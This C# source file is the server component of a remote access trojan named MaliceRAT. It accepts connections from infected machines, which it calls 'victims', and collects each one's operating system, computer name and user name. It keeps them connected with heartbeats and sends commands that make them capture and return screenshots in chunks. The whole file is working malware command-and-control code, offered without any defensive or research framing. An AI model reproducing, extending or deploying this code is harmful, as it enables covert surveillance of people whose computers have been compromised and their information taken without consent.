using System;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Timers;
using Newtonsoft.Json;
using System.Runtime.InteropServices;

namespace MaliceRAT.RatServer
{
    public class Server
    {
        public event Action<string> MessageReceived;
        public event Action<Victim> InfoReceived;
        public event Action<Victim> ClientConnected;
        public event Action<Victim> ClientDisconnected;
        public event Action<byte[]> ScreenshotReceived;
        private TcpListener server;
        private const int BufferSize = 1024 * 5;
        private const double HeartbeatInterval = 5000;
        private const int Port = 6666;
        public List<Victim> victims = new List<Victim>();
        private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();

        private StringBuilder screenshotBuilder = new StringBuilder();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();

        public Server()
        {
            AllocConsole();
        }
        public void StartServer()
        {
            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            server = new TcpListener(ipAddress, Port);
            server.Start();
            Console.WriteLine("Server started at " + server.LocalEndpoint);
            Task.Run(async () => await AcceptClients());
        }
        private async Task AcceptClients()
        {
            while (true)
            {
                TcpClient tcpClient = await server.AcceptTcpClientAsync();
                Victim client = new Victim(tcpClient, victims.Count);
                Console.WriteLine("Client number: " + client.Id);
                OnClientConnected(client);
                var clientTask = HandleClient(client);
                clientTasks[client.Id] = clientTask;
                await clientTask.ContinueWith(t => clientTasks.Remove(client.Id));
            }
        }

        private async Task HandleClient(Victim client)
        {
            using (NetworkStream stream = client.TcpClient.GetStream())
            {
                byte[] buffer = new byte[BufferSize];
                int bytesRead;

                Timer heartbeatTimer = new Timer(HeartbeatInterval);
                bool heartbeatReceived = true;

                heartbeatTimer.Elapsed += async (sender, e) =>
                {
                    if (!heartbeatReceived)
                    {
                        heartbeatTimer.Stop();
                        stream.Close();
                        OnClientDisconnected(client);
                        return;
                    }
                    heartbeatReceived = false;
                    await SendHeartbeat(stream);
                };
                heartbeatTimer.Start();

                while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                {
                    string receivedMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine("Received message: " + receivedMessage);
                    try
                    {
                        dynamic jsonMessage = JsonConvert.DeserializeObject(receivedMessage);

                        if (jsonMessage.type == "message")
                        {
                            OnMessageReceived(jsonMessage.text.ToString());
                        }
                        else if (jsonMessage.type == "info")
                        {
                            string OS = jsonMessage.os.ToString();
                            string PC = jsonMessage.pc.ToString();
                            string User = jsonMessage.user.ToString();

                            client.OS = OS;
                            client.PC = PC;
                            client.User = User;

                            InfoReceived?.Invoke(client);
                        }
                        else if (jsonMessage.type == "heartbeat")
                        {
                            heartbeatReceived = true;
                        }
                        else if (jsonMessage.type == "screenshot_chunk")
                        {
                            screenshotBuilder.Append(jsonMessage.data.ToString());
                            if (jsonMessage.final == true)
                            {
                                byte[] screenshotData = Convert.FromBase64String(screenshotBuilder.ToString());
                                Console.WriteLine("Complete screenshot received from client: " + client.IP);
                                OnScreenshotReceived(screenshotData);
                                screenshotBuilder.Clear();
                            }
                        }
                        else if (jsonMessage.type == "stop_screenshots")
                        {
                            Console.WriteLine("Client has stopped sending screenshots: " + client.IP);
                        }
                    }
                    catch (JsonReaderException)
                    {
                        Console.WriteLine("Invalid JSON received.");
                        continue;
                    }
                }
                
                heartbeatTimer.Stop();
                OnClientDisconnected(client);
            }
        }
        public void DisconnectClient(int id)
        {
            Victim client = null;
            foreach (var v in victims)
            {
                if (v.Id == id)
                {
                    client = v;
                    break;
                }
            }
            if (client != null)
            {
                client.TcpClient.Close();
            }
        }

        protected virtual void OnMessageReceived(string message)
        {
            MessageReceived?.Invoke(message);
        }

        protected virtual void OnClientConnected(Victim client)
        {
            victims.Add(client);
            Console.WriteLine("Client connected: " + client.IP);
            ClientConnected?.Invoke(client);
        }

        protected virtual void OnClientDisconnected(Victim client)
        {
            victims.Remove(client);
            Console.WriteLine("Client disconnected: " + client.IP);
            ClientDisconnected?.Invoke(client);
        }

        protected virtual void OnScreenshotReceived(byte[] screenshotData)
        {
            ScreenshotReceived?.Invoke(screenshotData);
        }

        private async Task SendHeartbeat(NetworkStream stream)
        {
            var heartbeat = new
            {
                type = "heartbeat",
                text = "ping"
            };
            string jsonHeartbeat = JsonConvert.SerializeObject(heartbeat);
            byte[] heartbeatBytes = Encoding.UTF8.GetBytes(jsonHeartbeat);
            if (stream.CanWrite)
            {
                await stream.WriteAsync(heartbeatBytes, 0, heartbeatBytes.Length);
            }
        }

        public Victim GetVictimById(int id)
        {
            return victims.Find(v => v.Id == id);
        }

        public void SetScreenUpdateInterval(int clientId, int interval)
        {
            Victim client = victims.Find(v => v.Id == clientId);
            if (client != null)
            {
                string message;
                if (interval > 0)
                {
                    message = JsonConvert.SerializeObject(new { type = "set_interval", interval = interval });
                }
                else
                {
                    message = JsonConvert.SerializeObject(new { type = "stop_screenshots" });
                }
                SendMessageToClient(client, message);
            }
        }

        private void SendMessageToClient(Victim client, string message)
        {
            byte[] data = Encoding.UTF8.GetBytes(message);
            client.TcpClient.GetStream().Write(data, 0, data.Length);
        }

        public void RequestScreenshot(int clientId)
        {
            Victim client = GetVictimById(clientId);
            if (client != null)
            {
                // Temporarily set a very short interval to trigger an immediate screenshot
                string startMessage = JsonConvert.SerializeObject(new { type = "set_interval", interval = 1 });
                SendMessageToClient(client, startMessage);

                System.Timers.Timer timer = new System.Timers.Timer(100);
                timer.Elapsed += (sender, args) =>
                {
                    string stopMessage = JsonConvert.SerializeObject(new { type = "stop_screenshots" });
                    SendMessageToClient(client, stopMessage);
                    timer.Stop();
                };
                timer.Start();
            }
        }
    }
}